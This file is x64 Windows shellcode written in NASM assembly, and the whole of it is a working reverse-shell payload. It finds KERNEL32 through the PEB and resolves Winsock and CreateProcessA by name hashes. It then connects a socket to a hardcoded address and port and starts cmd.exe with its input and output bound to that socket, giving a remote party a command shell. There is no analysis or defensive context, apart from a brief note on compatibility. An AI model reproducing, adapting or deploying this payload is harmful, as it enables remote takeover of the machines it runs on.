BITS 64

; Works in all WINDOWS environments where KERNEL32.DLL
; is the second library to load with a process.
;
; Notes: Updated for brevity :P

        PUSH    R12
        PUSH    R13
        PUSH    R14
        PUSH    R15

GET_KERNEL32:
        MOV     RAX,    GS:[0x60]
        MOV     RAX,    [RAX + 0x18]
        MOV     RAX,    [RAX + 0x30]
        MOV     RAX,    [RAX]
        MOV     RAX,    [RAX]
        MOV     RAX,    [RAX + 0x10]

GET_CREATEPROCESSA:
        MOV     RCX,    RAX
        MOV     RDX,    0x6ba6bcc9
        CALL    FIND_FUNCTION
        MOV     R15,    RAX

GET_LOADLIBRARYA:
        MOV     RDX,    0xc917432
        CALL    FIND_FUNCTION
        MOV     R14,    RAX

LOAD_WS232:
        PUSH    0x006c6c
        MOV     RAX,    0x642e32335f327377
        PUSH    RAX
        MOV     RCX,    RSP
        SUB     RSP,    0x0108
        CALL    R14

GET_WSASTARTUP:
        MOV     RCX,    RAX
        MOV     RDX,    0x80b46a3d
        CALL    FIND_FUNCTION
        MOV     R14,    RAX

GET_WSASOCKET:
        MOV     RDX,    0xde78322d
        CALL    FIND_FUNCTION
        MOV     R13,    RAX

GET_CONNECT:
        MOV     RDX,    0xc0577762
        CALL    FIND_FUNCTION
        MOV     R12,    RAX

        JMP     FUNCTIONS

FIND_FUNCTION:

PARSE_MODULE:
        MOV     R8D,    [RCX + 0x3c]
        LEA     R8,     [RCX + R8]
        MOV     R8D,    [R8  + 0x88]
        LEA     R8,     [RCX + R8]
        MOV     R9D,    [R8  + 0x18]
        MOV     R10D,   [R8  + 0x20]
        LEA     R10,    [RCX + R10]

SEARCH:
        DEC     R9
        MOV     ESI,    [R10 + R9  * 0x04]
        LEA     RSI,    [RCX + RSI]
        XOR     RAX,    RAX
        XOR     R11,    R11

HASH:
        LODSB
        TEST    AL,     AL
        JZ      COMPARE
        ROR     R11D,   0x07
        ADD     R11D,   EAX
        JMP     HASH

COMPARE:
        CMP     R11,    RDX
        JNZ     SEARCH

RETURN_FUNCTION:
        MOV     EAX,    [R8  + 0x24]
        LEA     RAX,    [RCX + RAX]
        MOVZX   EDX,    WORD [RAX + R9  * 0x02]
        MOV     EAX,    [R8  + 0x1c]
        LEA     RAX,    [RCX + RAX]
        MOV     EAX,    [RAX + RDX * 0x04]
        LEA     RAX,    [RCX + RAX]
        RET

FUNCTIONS:

RUN_WSASTARTUP:
        MOV     CX,     0x0202
        MOV     RDX,    RSP
        CALL    R14

RUN_WSASOCKETA:
        XOR     RDX,    RDX
        XOR     R8,     R8
        XOR     R9,     R9
        PUSH    RDX
        PUSH    RDX
        PUSH    RDX
        PUSH    RDX
        PUSH    RDX
        PUSH    RDX
        MOV     CL,     0x02
        MOV     DL,     0x01
        MOV     R8B,    0x06
        CALL    R13
        MOV     R14,    RAX

RUN_CONNECT:
        MOV     ECX,     EAX
        MOV     RAX,     0x0100007f5c110002
        PUSH    RAX
        MOV     RDX,     RSP
        MOV     R8B,     0x10
        CALL    R12

RUN_CREATEPROCESSA:
        PUSH    RAX
        MOV     RCX,    0x006578652e646d63
        PUSH    RCX
        MOV     RDX,    RSP
        PUSH    R14
        PUSH    R14
        PUSH    R14
        PUSH    RAX
        PUSH    RAX
        XOR     RCX,    RCX
        MOV     CL,     0x01
        ROR     RCX,    0x18
        PUSH    RCX
        PUSH    RAX
        PUSH    RAX
        PUSH    RAX
        PUSH    RAX
        PUSH    RAX
        PUSH    RAX
        PUSH    0x68
        LEA     RCX,    [RSP - 0x20]
        MOV     R8,     RSP
        PUSH    RCX
        PUSH    R8
        PUSH    RAX
        PUSH    RAX
        PUSH    0x08000000
        PUSH    0x01
        PUSH    RAX
        PUSH    RAX
        PUSH    RAX
        PUSH    RAX
        MOV     RCX,    RAX
        CALL    R15
        ADD     RSP,   0x0218
        POP     R15
        POP     R14
        POP     R13
        POP     R12
        RET